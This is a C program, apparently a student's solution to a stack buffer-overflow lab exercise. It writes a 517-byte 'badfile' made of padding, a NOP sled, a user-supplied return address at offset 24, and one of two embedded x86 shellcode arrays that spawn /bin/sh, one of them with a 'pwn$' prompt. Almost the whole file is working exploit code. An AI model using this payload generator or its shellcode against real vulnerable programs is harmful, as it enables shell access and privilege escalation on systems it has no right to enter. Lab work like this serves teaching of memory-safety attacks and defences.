/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode_short[] =
  "\x31\xc0"         /* Line 1:  xor     eax,eax               */
  "\x50"             /* Line 2:  push    eax                   */
  "\x68""//sh"       /* Line 3:  push    0x68732f2f            */
  "\x68""/bin"       /* Line 4:  push    0x6e69622f            */
  "\x89\xe3"         /* Line 5:  mov     ebx,esp               */
  "\x50"             /* Line 6:  push    eax                   */
  "\x53"             /* Line 7:  push    ebx                   */
  "\x89\xe1"         /* Line 8:  mov     ecx,esp               */
  "\x99"             /* Line 9:  cdq                           */
  "\xb0\x0b"         /* Line 10: mov     al,0xb                */
  "\xcd\x80"         /* Line 11: int     0x80                  */
;


const char shellcode_prompt[] =
  "\x31\xc0"         /* Line 1:  xor     eax,eax               */
  "\x50"             /* Line 2:  push    eax                   */
  "\x68""pwn$"       /* Line 3:  push    0x246e7770            */
  "\x68""PS1="       /* Line 4:  push    0x3d315350            */
  "\x89\xe2"         /* Line 5:  mov     edx,esp               */
  "\x50"             /* Line 6:  push    eax                   */
  "\x52"             /* Line 7:  push    edx                   */
  "\x89\xe2"         /* Line 8:  mov     edx,esp               */
  "\x50"             /* Line 9:  push    eax                   */
  "\x68""//sh"       /* Line 10: push    0x68732f2f            */
  "\x68""/bin"       /* Line 11: push    0x6e69622f            */
  "\x89\xe3"         /* Line 12: mov     ebx,esp               */
  "\x50"             /* Line 13: push    eax                   */
  "\x53"             /* Line 14: push    ebx                   */
  "\x89\xe1"         /* Line 15: mov     ecx,esp               */
  "\xb0\x0b"         /* Line 16: mov     al,0xb                */
  "\xcd\x80"         /* Line 17: int     0x80                  */
;

int main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    size_t res;
    unsigned int retaddr;
    char *valid;

    if(argc!=2){
      fprintf(stdout,"Usage: %s retaddr\n\n\tretaddr = Return address to use for the payload (in hexadecimal)\n", argv[0]);
      exit(-1);
    }

    retaddr = (unsigned int)strtol(argv[1], &valid, 16);
    if(retaddr == 0 && valid == argv[1]){
      fprintf(stderr,"Impossible to interpret return address\n");
      exit(-1);
    }
    fprintf(stdout, "We are going to build a payload with 0x%x as return address\n", retaddr);

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* TODO: You need to fill the buffer with appropriate contents here */
    /* Our solution is as short as two lines of C ! */
    memset(&buffer, 0x61, 24);
    //printf(argv[1]);
    //memset(&buffer+24, 0x61, 4);
    char * pointeur = buffer + 24;
    //strncpy(pointeur, argv[1], 8);
    printf("%x \n", retaddr);
    memcpy(pointeur, &retaddr, 4);
    pointeur += 12;
    memcpy(pointeur, &shellcode_prompt, 40);


    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    if(badfile == NULL){
      perror("Impossible to open badfile");
      exit(-1);
    }
    res=fwrite(buffer, 1, 517, badfile);
    if(res == 0 && ferror(badfile)){
      perror("Error while writing file");
      exit(-1);
    }
    if(res < 517){
      fprintf(stderr, "Impossible to write enough data. Only %lu bytes written.\n", res);
      exit(-1);
    }
    fclose(badfile);

    return 0;
}
